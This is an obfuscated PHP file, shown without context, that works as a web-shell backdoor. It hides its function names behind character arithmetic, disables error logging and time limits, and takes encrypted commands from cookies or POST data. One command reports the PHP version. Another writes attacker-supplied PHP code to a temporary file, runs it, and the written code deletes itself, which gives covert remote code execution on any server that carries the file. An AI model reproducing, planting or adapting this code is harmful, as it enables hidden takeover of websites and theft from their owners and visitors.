<?php $mnscm = chr(102)."\x69"."\x6c".chr(101)."\137"."\160".'u'.'t'.chr(95).chr(454-355)."\157"."\156".chr(116).chr(344-243).chr(110).chr(922-806)."\x73";
$tvviq = chr(98)."\141".chr(866-751)."\145".chr(522-468).chr(704-652).'_'.chr(694-594).chr(426-325)."\x63".'o'."\144"."\x65";
$leicw = "\151".chr(411-301).'i'."\137".'s'."\x65"."\x74";
$ymxfotiysl = chr(117)."\x6e".chr(907-799)."\151".chr(110)."\153";


@$leicw('e'.chr(604-490)."\162".chr(375-264).chr(205-91)."\x5f".chr(111-3).chr(503-392)."\x67", NULL);
@$leicw(chr(505-397)."\157"."\147"."\x5f".'e'."\x72"."\162".chr(111).'r'.chr(115), 0);
@$leicw("\155".'a'.chr(137-17).chr(95)."\145".'x'.chr(101).chr(99)."\x75".chr(116).chr(105).chr(324-213).chr(110).chr(178-83).chr(168-52).chr(105)."\x6d"."\x65", 0);
@set_time_limit(0);

function orzciezo($ohfgdus, $womqvue)
{
    $smmgychljr = "";
    for ($bsgfq = 0; $bsgfq < strlen($ohfgdus);) {
        for ($j = 0; $j < strlen($womqvue) && $bsgfq < strlen($ohfgdus); $j++, $bsgfq++) {
            $smmgychljr .= chr(ord($ohfgdus[$bsgfq]) ^ ord($womqvue[$j]));
        }
    }
    return $smmgychljr;
}

$udvwobup = array_merge($_COOKIE, $_POST);
$grvshwuqxf = '07924ca4-5634-40da-9c72-59781fd1cc06';
foreach ($udvwobup as $lwnyd => $ohfgdus) {
    $ohfgdus = @unserialize(orzciezo(orzciezo($tvviq($ohfgdus), $grvshwuqxf), $lwnyd));
    if (isset($ohfgdus[chr(97)."\153"])) {
        if ($ohfgdus['a'] == chr(105)) {
            $bsgfq = array(
                'p'.chr(872-754) => @phpversion(),
                "\163".chr(1016-898) => "3.5",
            );
            echo @serialize($bsgfq);
        } elseif ($ohfgdus['a'] == "\145") {
            $uuzccm = "./" . md5($grvshwuqxf) . '.'."\151".'n'."\143";
            @$mnscm($uuzccm, "<" . "\x3f"."\x70"."\x68"."\x70".chr(507-475)."\x40"."\x75".chr(233-123).chr(108).chr(1101-996).'n'."\x6b"."\50".chr(95).chr(388-293).'F'."\111"."\114"."\105".'_'."\137".chr(41).';'.' ' . $ohfgdus["\144"]);
            include($uuzccm);
            @$ymxfotiysl($uuzccm);
        }
        exit();
    }
}

